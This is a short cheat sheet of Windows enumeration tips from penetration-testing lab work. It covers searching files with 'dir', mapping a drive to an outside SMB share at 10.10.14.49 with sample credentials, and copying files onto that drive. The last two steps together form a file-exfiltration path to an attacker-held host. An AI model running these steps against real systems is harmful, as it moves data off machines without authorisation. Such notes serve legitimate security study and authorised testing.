# Windows Enumeration Tips
 
 ## Searching files with dir
 ```
 [@swisskyrepo] https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md
 
 dir /S /B filename*.txt
 ```

 ## Map Drive from CLI
 ```
 net use f: \\10.10.14.49\files /user:ph0enix password123
 net use M: \\ip-address\share /Persistent:Yes
 ```

 ## Copy File to Mapped Drive
 ```
 cp <filename> f:\ 
 (or location)
 ```